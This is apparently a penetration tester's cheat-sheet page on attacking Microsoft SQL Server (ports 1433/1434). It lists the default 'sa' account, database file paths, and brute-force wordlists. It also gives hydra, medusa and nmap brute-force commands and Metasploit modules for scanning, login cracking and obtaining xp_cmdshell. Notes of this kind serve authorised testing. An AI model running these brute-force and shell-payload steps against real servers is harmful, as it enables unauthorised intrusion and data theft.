# TCP 1433, UDP 1434: MSSQL Server

> Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network.  
>
>  -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Microsoft_SQL_Server)</cite>

## Related

[SQSH](bear://x-callback-url/open-note?id=A954ECDE-8119-4CDE-85F6-AB8384D137FB-524-00001DF0A3A02467)

## General

Default admin account: `sa`  

Interesting paths (example: Microsoft SQL Server 2017 14.00.1000.00)
```bash
C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\DATA\master.mdf
```

```bash
C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Backup\master.mdf
```

```bash
C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Backup\master.bak
```

### Brute force login

Wordlists
```bash
/usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt
```

```bash
/usr/share/seclists/Usernames/mssql-usernames-nansh0u-guardicore.txt
```

```bash
/usr/share/seclists/Passwords/mssql-passwords-nansh0u-guardicore.txt
```

Tools
```bash
hydra -L <users-file> -P <pw-file> <ip> mssql -vV
```

```baSH
medusa -U <users-file> -P <pw-file> -M mssql -h <ip>
```

```bash
nmap -p 1433 --script=ms-sql-brute.nse --script-args userdb<users-file,passdb=<pw-file> <ip>
```

## Metasploit

* [Hunting for MSSQL - Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/hunting-mssql/)
* [How to Hack Databases: Cracking SQL Server Passwords & Owning the Server « Null Byte :: WonderHowTo](https://null-byte.wonderhowto.com/how-to/hack-databases-cracking-sql-server-passwords-owning-server-0149636/)

Find MSSQL instances
```bash
auxiliary/scanner/mssql/mssql_ping
```

Brute force login
```bash
scanner/mssql/mssql_login
```

Obtain a `xp_cmdshell` using
```bash
windows/mssql/mssql_payload
```
